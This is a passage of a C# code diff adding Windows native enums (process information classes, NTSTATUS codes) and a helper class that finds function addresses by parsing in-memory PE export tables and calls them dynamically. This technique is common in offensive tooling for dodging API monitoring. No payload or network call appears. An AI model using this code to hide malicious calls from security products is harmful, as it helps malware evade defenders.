+            ProcessCookie, // q: ULONG
+            ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
+            ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION
+            ProcessPagePriority, // q: ULONG
+            ProcessInstrumentationCallback, // 40
+            ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
+            ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
+            ProcessImageFileNameWin32, // q: UNICODE_STRING
+            ProcessImageFileMapping, // q: HANDLE (input)
+            ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
+            ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
+            ProcessGroupInformation, // q: USHORT[]
+            ProcessTokenVirtualizationEnabled, // s: ULONG
+            ProcessConsoleHostProcess, // q: ULONG_PTR
+            ProcessWindowInformation, // 50, q: PROCESS_WINDOW_INFORMATION
+            ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
+            ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
+            ProcessDynamicFunctionTableInformation,
+            ProcessHandleCheckingMode,
+            ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
+            ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
+            MaxProcessInfoClass
+        };
+
+        /// <summary>
+        /// NTSTATUS is an undocument enum. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
+        /// https://www.pinvoke.net/default.aspx/Enums/NtStatus.html
+        /// </summary>
+        public enum NTSTATUS : uint
+        {
+            // Success
+            Success = 0x00000000,
+            Wait0 = 0x00000000,
+            Wait1 = 0x00000001,
+            Wait2 = 0x00000002,
+            Wait3 = 0x00000003,
+            Wait63 = 0x0000003f,
+            Abandoned = 0x00000080,
+            AbandonedWait0 = 0x00000080,
+            AbandonedWait1 = 0x00000081,
+            AbandonedWait2 = 0x00000082,
+            AbandonedWait3 = 0x00000083,
+            AbandonedWait63 = 0x000000bf,
+            UserApc = 0x000000c0,
+            KernelApc = 0x00000100,
+            Alerted = 0x00000101,
+            Timeout = 0x00000102,
+            Pending = 0x00000103,
+            Reparse = 0x00000104,
+            MoreEntries = 0x00000105,
+            NotAllAssigned = 0x00000106,
+            SomeNotMapped = 0x00000107,
+            OpLockBreakInProgress = 0x00000108,
+            VolumeMounted = 0x00000109,
+            RxActCommitted = 0x0000010a,
+            NotifyCleanup = 0x0000010b,
+            NotifyEnumDir = 0x0000010c,
+            NoQuotasForAccount = 0x0000010d,
+            PrimaryTransportConnectFailed = 0x0000010e,
+            PageFaultTransition = 0x00000110,
+            PageFaultDemandZero = 0x00000111,
+            PageFaultCopyOnWrite = 0x00000112,
+            PageFaultGuardPage = 0x00000113,
+            PageFaultPagingFile = 0x00000114,
+            CrashDump = 0x00000116,
+            ReparseObject = 0x00000118,
+            NothingToTerminate = 0x00000122,
+            ProcessNotInJob = 0x00000123,
+            ProcessInJob = 0x00000124,
+            ProcessCloned = 0x00000129,
+            FileLockedWithOnlyReaders = 0x0000012a,
+            FileLockedWithWriters = 0x0000012b,
+
+            // Informational
+            Informational = 0x40000000,
+            ObjectNameExists = 0x40000000,
+            ThreadWasSuspended = 0x40000001,
+            WorkingSetLimitRange = 0x40000002,
+            ImageNotAtBase = 0x40000003,
+            RegistryRecovered = 0x40000009,
+
+            // Warning
+            Warning = 0x80000000,
+            GuardPageViolation = 0x80000001,
+            DatatypeMisalignment = 0x80000002,
+            Breakpoint = 0x80000003,
+            SingleStep = 0x80000004,
+            BufferOverflow = 0x80000005,
+            NoMoreFiles = 0x80000006,
+            HandlesClosed = 0x8000000a,
+            PartialCopy = 0x8000000d,
+            DeviceBusy = 0x80000011,
+            InvalidEaName = 0x80000013,
+            EaListInconsistent = 0x80000014,
+            NoMoreEntries = 0x8000001a,
+            LongJump = 0x80000026,
+            DllMightBeInsecure = 0x8000002b,
+
+            // Error
+            Error = 0xc0000000,
+            Unsuccessful = 0xc0000001,
+            NotImplemented = 0xc0000002,
+            InvalidInfoClass = 0xc0000003,
+            InfoLengthMismatch = 0xc0000004,
+            AccessViolation = 0xc0000005,
+            InPageError = 0xc0000006,
+            PagefileQuota = 0xc0000007,
+            InvalidHandle = 0xc0000008,
+            BadInitialStack = 0xc0000009,
+            BadInitialPc = 0xc000000a,
+            InvalidCid = 0xc000000b,
+            TimerNotCanceled = 0xc000000c,
+            InvalidParameter = 0xc000000d,
+            NoSuchDevice = 0xc000000e,
+            NoSuchFile = 0xc000000f,
+            InvalidDeviceRequest = 0xc0000010,
+            EndOfFile = 0xc0000011,
+            WrongVolume = 0xc0000012,
+            NoMediaInDevice = 0xc0000013,
+            NoMemory = 0xc0000017,
+            ConflictingAddresses = 0xc0000018,
+            NotMappedView = 0xc0000019,
+            UnableToFreeVm = 0xc000001a,
+            UnableToDeleteSection = 0xc000001b,
+            IllegalInstruction = 0xc000001d,
+            AlreadyCommitted = 0xc0000021,
+            AccessDenied = 0xc0000022,
+            BufferTooSmall = 0xc0000023,
+            ObjectTypeMismatch = 0xc0000024,
+            NonContinuableException = 0xc0000025,
+            BadStack = 0xc0000028,
+            NotLocked = 0xc000002a,
+            NotCommitted = 0xc000002d,
+            InvalidParameterMix = 0xc0000030,
+            ObjectNameInvalid = 0xc0000033,
+            ObjectNameNotFound = 0xc0000034,
+            ObjectNameCollision = 0xc0000035,
+            ObjectPathInvalid = 0xc0000039,
+            ObjectPathNotFound = 0xc000003a,
+            ObjectPathSyntaxBad = 0xc000003b,
+            DataOverrun = 0xc000003c,
+            DataLate = 0xc000003d,
+            DataError = 0xc000003e,
+            CrcError = 0xc000003f,
+            SectionTooBig = 0xc0000040,
+            PortConnectionRefused = 0xc0000041,
+            InvalidPortHandle = 0xc0000042,
+            SharingViolation = 0xc0000043,
+            QuotaExceeded = 0xc0000044,
+            InvalidPageProtection = 0xc0000045,
+            MutantNotOwned = 0xc0000046,
+            SemaphoreLimitExceeded = 0xc0000047,
+            PortAlreadySet = 0xc0000048,
+            SectionNotImage = 0xc0000049,
+            SuspendCountExceeded = 0xc000004a,
+            ThreadIsTerminating = 0xc000004b,
+            BadWorkingSetLimit = 0xc000004c,
+            IncompatibleFileMap = 0xc000004d,
+            SectionProtection = 0xc000004e,
+            EasNotSupported = 0xc000004f,
+            EaTooLarge = 0xc0000050,
+            NonExistentEaEntry = 0xc0000051,
+            NoEasOnFile = 0xc0000052,
+            EaCorruptError = 0xc0000053,
+            FileLockConflict = 0xc0000054,
+            LockNotGranted = 0xc0000055,
+            DeletePending = 0xc0000056,
+            CtlFileNotSupported = 0xc0000057,
+            UnknownRevision = 0xc0000058,
+            RevisionMismatch = 0xc0000059,
+            InvalidOwner = 0xc000005a,
+            InvalidPrimaryGroup = 0xc000005b,
+            NoImpersonationToken = 0xc000005c,
+            CantDisableMandatory = 0xc000005d,
+            NoLogonServers = 0xc000005e,
+            NoSuchLogonSession = 0xc000005f,
+            NoSuchPrivilege = 0xc0000060,
+            PrivilegeNotHeld = 0xc0000061,
+            InvalidAccountName = 0xc0000062,
+            UserExists = 0xc0000063,
+            NoSuchUser = 0xc0000064,
+            GroupExists = 0xc0000065,
+            NoSuchGroup = 0xc0000066,
+            MemberInGroup = 0xc0000067,
+            MemberNotInGroup = 0xc0000068,
+            LastAdmin = 0xc0000069,
+            WrongPassword = 0xc000006a,
+            IllFormedPassword = 0xc000006b,
+            PasswordRestriction = 0xc000006c,
+            LogonFailure = 0xc000006d,
+            AccountRestriction = 0xc000006e,
+            InvalidLogonHours = 0xc000006f,
+            InvalidWorkstation = 0xc0000070,
+            PasswordExpired = 0xc0000071,
+            AccountDisabled = 0xc0000072,
+            NoneMapped = 0xc0000073,
+            TooManyLuidsRequested = 0xc0000074,
+            LuidsExhausted = 0xc0000075,
+            InvalidSubAuthority = 0xc0000076,
+            InvalidAcl = 0xc0000077,
+            InvalidSid = 0xc0000078,
+            InvalidSecurityDescr = 0xc0000079,
+            ProcedureNotFound = 0xc000007a,
+            InvalidImageFormat = 0xc000007b,
+            NoToken = 0xc000007c,
+            BadInheritanceAcl = 0xc000007d,
+            RangeNotLocked = 0xc000007e,
+            DiskFull = 0xc000007f,
+            ServerDisabled = 0xc0000080,
+            ServerNotDisabled = 0xc0000081,
+            TooManyGuidsRequested = 0xc0000082,
+            GuidsExhausted = 0xc0000083,
+            InvalidIdAuthority = 0xc0000084,
+            AgentsExhausted = 0xc0000085,
+            InvalidVolumeLabel = 0xc0000086,
+            SectionNotExtended = 0xc0000087,
+            NotMappedData = 0xc0000088,
+            ResourceDataNotFound = 0xc0000089,
+            ResourceTypeNotFound = 0xc000008a,
+            ResourceNameNotFound = 0xc000008b,
+            ArrayBoundsExceeded = 0xc000008c,
+            FloatDenormalOperand = 0xc000008d,
+            FloatDivideByZero = 0xc000008e,
+            FloatInexactResult = 0xc000008f,
+            FloatInvalidOperation = 0xc0000090,
+            FloatOverflow = 0xc0000091,
+            FloatStackCheck = 0xc0000092,
+            FloatUnderflow = 0xc0000093,
+            IntegerDivideByZero = 0xc0000094,
+            IntegerOverflow = 0xc0000095,
+            PrivilegedInstruction = 0xc0000096,
+            TooManyPagingFiles = 0xc0000097,
+            FileInvalid = 0xc0000098,
+            InsufficientResources = 0xc000009a,
+            InstanceNotAvailable = 0xc00000ab,
+            PipeNotAvailable = 0xc00000ac,
+            InvalidPipeState = 0xc00000ad,
+            PipeBusy = 0xc00000ae,
+            IllegalFunction = 0xc00000af,
+            PipeDisconnected = 0xc00000b0,
+            PipeClosing = 0xc00000b1,
+            PipeConnected = 0xc00000b2,
+            PipeListening = 0xc00000b3,
+            InvalidReadMode = 0xc00000b4,
+            IoTimeout = 0xc00000b5,
+            FileForcedClosed = 0xc00000b6,
+            ProfilingNotStarted = 0xc00000b7,
+            ProfilingNotStopped = 0xc00000b8,
+            NotSameDevice = 0xc00000d4,
+            FileRenamed = 0xc00000d5,
+            CantWait = 0xc00000d8,
+            PipeEmpty = 0xc00000d9,
+            CantTerminateSelf = 0xc00000db,
+            InternalError = 0xc00000e5,
+            InvalidParameter1 = 0xc00000ef,
+            InvalidParameter2 = 0xc00000f0,
+            InvalidParameter3 = 0xc00000f1,
+            InvalidParameter4 = 0xc00000f2,
+            InvalidParameter5 = 0xc00000f3,
+            InvalidParameter6 = 0xc00000f4,
+            InvalidParameter7 = 0xc00000f5,
+            InvalidParameter8 = 0xc00000f6,
+            InvalidParameter9 = 0xc00000f7,
+            InvalidParameter10 = 0xc00000f8,
+            InvalidParameter11 = 0xc00000f9,
+            InvalidParameter12 = 0xc00000fa,
+            ProcessIsTerminating = 0xc000010a,
+            MappedFileSizeZero = 0xc000011e,
+            TooManyOpenedFiles = 0xc000011f,
+            Cancelled = 0xc0000120,
+            CannotDelete = 0xc0000121,
+            InvalidComputerName = 0xc0000122,
+            FileDeleted = 0xc0000123,
+            SpecialAccount = 0xc0000124,
+            SpecialGroup = 0xc0000125,
+            SpecialUser = 0xc0000126,
+            MembersPrimaryGroup = 0xc0000127,
+            FileClosed = 0xc0000128,
+            TooManyThreads = 0xc0000129,
+            ThreadNotInProcess = 0xc000012a,
+            TokenAlreadyInUse = 0xc000012b,
+            PagefileQuotaExceeded = 0xc000012c,
+            CommitmentLimit = 0xc000012d,
+            InvalidImageLeFormat = 0xc000012e,
+            InvalidImageNotMz = 0xc000012f,
+            InvalidImageProtect = 0xc0000130,
+            InvalidImageWin16 = 0xc0000131,
+            LogonServer = 0xc0000132,
+            DifferenceAtDc = 0xc0000133,
+            SynchronizationRequired = 0xc0000134,
+            DllNotFound = 0xc0000135,
+            IoPrivilegeFailed = 0xc0000137,
+            OrdinalNotFound = 0xc0000138,
+            EntryPointNotFound = 0xc0000139,
+            ControlCExit = 0xc000013a,
+            InvalidAddress = 0xc0000141,
+            PortNotSet = 0xc0000353,
+            DebuggerInactive = 0xc0000354,
+            CallbackBypass = 0xc0000503,
+            PortClosed = 0xc0000700,
+            MessageLost = 0xc0000701,
+            InvalidMessage = 0xc0000702,
+            RequestCanceled = 0xc0000703,
+            RecursiveDispatch = 0xc0000704,
+            LpcReceiveBufferExpected = 0xc0000705,
+            LpcInvalidConnectionUsage = 0xc0000706,
+            LpcRequestsNotAllowed = 0xc0000707,
+            ResourceInUse = 0xc0000708,
+            ProcessIsProtected = 0xc0000712,
+            VolumeDirty = 0xc0000806,
+            FileCheckedOut = 0xc0000901,
+            CheckOutRequired = 0xc0000902,
+            BadFileType = 0xc0000903,
+            FileTooLarge = 0xc0000904,
+            FormsAuthRequired = 0xc0000905,
+            VirusInfected = 0xc0000906,
+            VirusDeleted = 0xc0000907,
+            TransactionalConflict = 0xc0190001,
+            InvalidTransaction = 0xc0190002,
+            TransactionNotActive = 0xc0190003,
+            TmInitializationFailed = 0xc0190004,
+            RmNotActive = 0xc0190005,
+            RmMetadataCorrupt = 0xc0190006,
+            TransactionNotJoined = 0xc0190007,
+            DirectoryNotRm = 0xc0190008,
+            CouldNotResizeLog = 0xc0190009,
+            TransactionsUnsupportedRemote = 0xc019000a,
+            LogResizeInvalidSize = 0xc019000b,
+            RemoteFileVersionMismatch = 0xc019000c,
+            CrmProtocolAlreadyExists = 0xc019000f,
+            TransactionPropagationFailed = 0xc0190010,
+            CrmProtocolNotFound = 0xc0190011,
+            TransactionSuperiorExists = 0xc0190012,
+            TransactionRequestNotValid = 0xc0190013,
+            TransactionNotRequested = 0xc0190014,
+            TransactionAlreadyAborted = 0xc0190015,
+            TransactionAlreadyCommitted = 0xc0190016,
+            TransactionInvalidMarshallBuffer = 0xc0190017,
+            CurrentTransactionNotValid = 0xc0190018,
+            LogGrowthFailed = 0xc0190019,
+            ObjectNoLongerExists = 0xc0190021,
+            StreamMiniversionNotFound = 0xc0190022,
+            StreamMiniversionNotValid = 0xc0190023,
+            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
+            CantOpenMiniversionWithModifyIntent = 0xc0190025,
+            CantCreateMoreStreamMiniversions = 0xc0190026,
+            HandleNoLongerValid = 0xc0190028,
+            NoTxfMetadata = 0xc0190029,
+            LogCorruptionDetected = 0xc0190030,
+            CantRecoverWithHandleOpen = 0xc0190031,
+            RmDisconnected = 0xc0190032,
+            EnlistmentNotSuperior = 0xc0190033,
+            RecoveryNotNeeded = 0xc0190034,
+            RmAlreadyStarted = 0xc0190035,
+            FileIdentityNotPersistent = 0xc0190036,
+            CantBreakTransactionalDependency = 0xc0190037,
+            CantCrossRmBoundary = 0xc0190038,
+            TxfDirNotEmpty = 0xc0190039,
+            IndoubtTransactionsExist = 0xc019003a,
+            TmVolatile = 0xc019003b,
+            RollbackTimerExpired = 0xc019003c,
+            TxfAttributeCorrupt = 0xc019003d,
+            EfsNotAllowedInTransaction = 0xc019003e,
+            TransactionalOpenNotAllowed = 0xc019003f,
+            TransactedMappingUnsupportedRemote = 0xc0190040,
+            TxfMetadataAlreadyPresent = 0xc0190041,
+            TransactionScopeCallbacksNotSet = 0xc0190042,
+            TransactionRequiredPromotion = 0xc0190043,
+            CannotExecuteFileInTransaction = 0xc0190044,
+            TransactionsNotFrozen = 0xc0190045,
+
+            MaximumNtStatus = 0xffffffff
+        }
+    }
+
+    public class Generic
+    {
+
+        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
+        {
+            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
+            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
+        }
+
+        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
+        {
+            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
+            return funcDelegate.DynamicInvoke(Parameters);
+        }
+
+        public static IntPtr LoadModuleFromDisk(string DLLPath)
+        {
+            Native.UNICODE_STRING uModuleName = new Native.UNICODE_STRING();
+            Native.RtlInitUnicodeString(ref uModuleName, DLLPath);
+
+            IntPtr hModule = IntPtr.Zero;
+            Native.NTSTATUS CallResult = Native.LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
+            if (CallResult != Native.NTSTATUS.Success || hModule == IntPtr.Zero)
+            {
+                return IntPtr.Zero;
+            }
+
+            return hModule;
+        }
+
+        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
+        {
+            IntPtr hModule = GetLoadedModuleAddress(DLLName);
+            if (hModule == IntPtr.Zero && CanLoadFromDisk)
+            {
+                hModule = LoadModuleFromDisk(DLLName);
+                if (hModule == IntPtr.Zero)
+                {
+                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
+                }
+            }
+            else if (hModule == IntPtr.Zero)
+            {
+                throw new DllNotFoundException(DLLName + ", Dll was not found.");
+            }
+
+            return GetExportAddress(hModule, FunctionName);
+        }
+
+        public static IntPtr GetLoadedModuleAddress(string DLLName)
+        {
+            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
+            foreach (ProcessModule Mod in ProcModules)
+            {
+                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
+                {
+                    return Mod.BaseAddress;
+                }
+            }
+            return IntPtr.Zero;
+        }
+
+        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
+        {
+            IntPtr FunctionPtr = IntPtr.Zero;
+            try
+            {
+                // Traverse the PE header in memory
+                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+                Int64 pExport = 0;
+                if (Magic == 0x010b)
+                {
+                    pExport = OptHeader + 0x60;
+                }
+                else
+                {
+                    pExport = OptHeader + 0x70;
+                }
+
+                // Read -> IMAGE_EXPORT_DIRECTORY
+                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+
+                // Loop the array of export name RVA's
+                for (int i = 0; i < NumberOfNames; i++)
+                {
+                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
+                    {
+                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                        break;
+                    }
+                }
+            }
+            catch
+            {
+                // Catch parser failure
+                throw new InvalidOperationException("Failed to parse module exports.");
+            }
+
+            if (FunctionPtr == IntPtr.Zero)
+            {
+                // Export not found
+                throw new MissingMethodException(ExportName + ", export not found.");
+            }
+            return FunctionPtr;
+        }
+
+    }
+}
+
